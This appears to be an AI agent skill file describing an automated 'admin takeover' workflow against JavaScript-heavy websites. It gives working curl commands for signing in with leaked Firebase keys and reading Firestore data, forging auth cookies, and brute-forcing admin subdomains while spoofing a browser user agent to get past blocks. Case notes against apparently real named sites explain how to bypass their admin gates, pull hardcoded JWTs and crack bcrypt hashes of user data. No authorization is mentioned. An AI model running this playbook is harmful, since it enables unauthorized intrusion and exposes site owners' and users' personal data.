---
name: web2-admin-takeover
description: "automated admin takeover via JS bundle analysis"
metadata:
  version: 1.0.0
  hermes:
    tags: [web2, admin-takeover, js-bundle, firebase, supabase, auth-bypass, nextjs, react]
    category: security
---

# Web2 Admin Takeover — Automated JS Bundle Hunt

## Triggers
- "web2 admin takeover", "ambil alih admin", "admin panel bypass"
- "cari credentials di JS", "hardcoded password", "firebase leak"
- "JS bundle analysis", "Next.js admin hunt"
- Target with Next.js/React/Vite/Svelte frontend

## Workflow

### 1. Run the automated scanner
```bash
./scripts/web2-hunt.sh https://target.com
```

### 2. Read the report
```bash
cat /tmp/web2-hunt-*/report.txt
cat /tmp/web2-hunt-*/findings.txt
cat /tmp/web2-hunt-*/auth_test.txt
```

### 3. If Firebase/Supabase found
```bash
# Firebase: sign in and get token
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=APIKEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"...","password":"...","returnSecureToken":true}'

# Read Firestore
curl -H "Authorization: Bearer $TOKEN" \
  "https://firestore.googleapis.com/v1/projects/PROJECTID/databases/(default)/documents/"

# Supabase
curl "https://PROJECTID.supabase.co/rest/v1/" -H "apikey: $KEY"
```

### 4. If auth bypass found
```bash
# Cookie forge
curl -I -H "Cookie: auth-token=true" https://target.com/admin/blogs
curl -I -H "Cookie: session=admin" https://target.com/dashboard
```

### 5. If XSS sink found
```bash
# Check for dangerouslySetInnerHTML, innerHTML, eval
grep -roP "dangerouslySetInnerHTML|innerHTML\s*=|__html" chunks/
```

## Key Criteria for Vulnerability

| Criteria | Vulnerable | Safe |
|----------|-----------|------|
| Framework | Next.js SPA, React SPA, Vite | Server-rendered (PHP, Rails) |
| Auth | Client-side cookie check, password in JS | Server-side session, HttpOnly, signed JWT |
| Backend | Firebase/Supabase config in JS bundle | Backend API with server-side auth |
| Render | `dangerouslySetInnerHTML` without sanitize | React auto-escape, DOMPurify |

## Red-Teamer Evidence Format (Trigger → Effect → Trust Boundary)

Every finding must be reported as **[Trigger → Effect → Trust Boundary] + Exploitable vs Blocked + curl evidence**. This is the format reviewers expect for `auth bypass, JWT forgery, IDOR, SSRF, SSTI, admin exposure` hunts:

```
[Trigger]  curl -A "Mozilla/5.0 ..." https://target/admin  →  [Effect] 200 + localStorage.setItem("vtcn_session","active") → dashboard  →  [Trust Boundary] Browser localStorage → Admin Control Plane  →  ✅ EXPLOITABLE
[Trigger]  GET /.env  →  [Effect] 200 2519B <!DOCTYPE html> == index.html  →  [Trust Boundary] Public Internet → Static CDN  →  ⛔ BLOCKED (SPA catch-all fake 200)
```

**Subdomain admin discovery (versatizecoin 2026-08-16):** main `www` has NO admin route (`/admin` → 2519B SPA). Real panel lives on `admin.versatizecoin.com` — found only by `for s in api admin docs explorer; do curl -s -o /dev/null -w "$s %{http_code}\n" "https://$s.$domain/" --max-time 4 -A "Mozilla/5.0 ..."`. Always brute `api/admin/app/dashboard/docs/www/mail/blog/scan/explorer/node/rpc/wallet` with Mozilla UA before declaring "no admin". Cross-check `crt.sh` but Cloudflare 502 is common.

**Mozilla masquerade:** all probes must use `-A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"` — `aelfscan` and `bityuan` chunks return 403 on `python-requests`/`urllib` default UA; Cloudflare may also serve different cache.

## Pitfalls
- **Polyfill noise**: initial grep for "password" returns URL parsing polyfills. Use `grep -v` to filter.
- **Firebase config split**: Firebase config may be in multiple chunks, not one file. Search for `apiKey`, `projectId`, `authDomain` separately.
- **Admin paths**: Next.js App Router bundles admin routes in the public layout chunk. Look for `/admin/` in layout chunks.
- **Vercel deployment**: Vercel adds `dpl_*` query params to JS URLs. Strip them or use wildcard download.
- **Cloudflare WAF**: Some targets block rapid JS downloads. Add `sleep 1` between downloads if rate-limited.
- **Vite localStorage-only gate (versatizecoin 2026-08)**: `admin.versatizecoin.com` Vite SPA `index-C5PL2nl1.js` 879KB — auth is `localStorage.getItem("vtcn_session")&&set("active")` with no fetch. `grep -n localStorage` shows `useEffect(()=>{localStorage.getItem("vtcn_session")&&t(!0)}); const T=()=>{t(!0),localStorage.setItem("vtcn_session","active")}`. Bypass: `localStorage.setItem("vtcn_session","active")` → full dashboard (Blog/Subscribers/Feedback/Documents/Social/Settings). Components `Jee` (login, `setTimeout 1500→set active`) and `Kee` (recovery fake) are decoys. Same pattern appears as `auth-token=true`, `session=admin` — always `grep -n "localStorage.*session\\|vtcn_session\\|auth.*active"` and test forge before reporting Firebase. Reference: `examples/hunts/recon/web2-admin-takeover/versatizecoin-admin-localstorage-bypass-2026-08.md`.
- **Cookie-based auth gate (bcswap 2026-08-16)**: When `api.set("admin_token", token, {expires: 7})` stores with expiry, `api` may be a cookie wrapper (e.g. `var api = init(defaultConverter, {path: "/"})` — js-cookie pattern), NOT localStorage. Grep for `api.set` or `Cookies.set` in the bundle. Bypass: `document.cookie = "admin_token=anything; path=/; max-age=604800"` in console. The cookie is only a client-side routing gate; real API auth is typically a hardcoded JWT in the axios instance. Test both: (1) set cookie → navigate to `/admin/dashboard`, (2) verify API calls still carry the hardcoded `Authorization` header. **Full bcswap case study** (hardcoded JWT + cookie bypass + unauthenticated media upload + Multer stack trace + Joi validation-before-auth oracle → complete admin takeover chain): `examples/hunts/recon/web2-admin-takeover/bcswap-admin-takeover-2026-08.md`.
- **DEX/swap frontend hardcoded ADMIN JWT (versatizecoin/bcswap 2026-08-16)**: When the main site is a static SPA, the REAL admin backend often lives on a sibling DEX/swap subdomain (e.g., `bcswap.org`). DEX bundles (6MB+) embed hardcoded `ACCESS_TOKEN` JWTs in axios defaults. Extract the JWT, decode the payload (no key needed), crack any bcrypt hash in the payload, and verify against the backend with-vs-without token. The JWT payload often contains full user data (name, email, phone, role, bcrypt hash). Absence of `exp` = permanent token. Different error messages with/without token prove the JWT is actively validated. Full technique: `web2/js-secret-scanner/references/jwt-bcrypt-extraction-workflow.md`. **Full bcswap chain**: `examples/hunts/recon/web2-admin-takeover/bcswap-admin-takeover-2026-08.md`.

## Reference Files
- `scripts/web2-hunt.sh` — Automated scanner script